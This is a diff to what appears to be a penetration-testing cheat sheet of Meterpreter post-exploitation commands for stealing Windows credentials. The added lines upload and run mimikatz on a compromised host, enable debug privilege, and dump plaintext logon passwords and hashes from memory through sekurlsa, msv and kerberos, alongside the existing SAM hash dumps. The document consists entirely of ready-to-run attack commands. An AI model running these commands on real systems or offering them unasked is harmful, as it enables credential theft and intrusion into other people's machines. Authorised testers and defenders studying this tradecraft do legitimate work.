@@ -7,7 +7,22 @@ run post/windows/gather/hashdump
 # LSA dump (module mimikatz)
 load mimikatz
 mimikatz_command -f samdump::hashes
+mimikatz_command -f sekurlsa::searchPasswords
 
 # LSA dump 3 (module kiwi)
 load kiwi
 lsa_dump_sam
+
+# Reading Hashes and Passwords from Memory
+meterpreter > msv
+meterpreter > kerberos
+
+# Upload an execute mimikatz.exe 
+meterpreter > upload /usr/share/mimikatz/Win32/mimikatz.exe
+meterpreter > shell
+C:\WINDOWS\system32>mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+
+
+
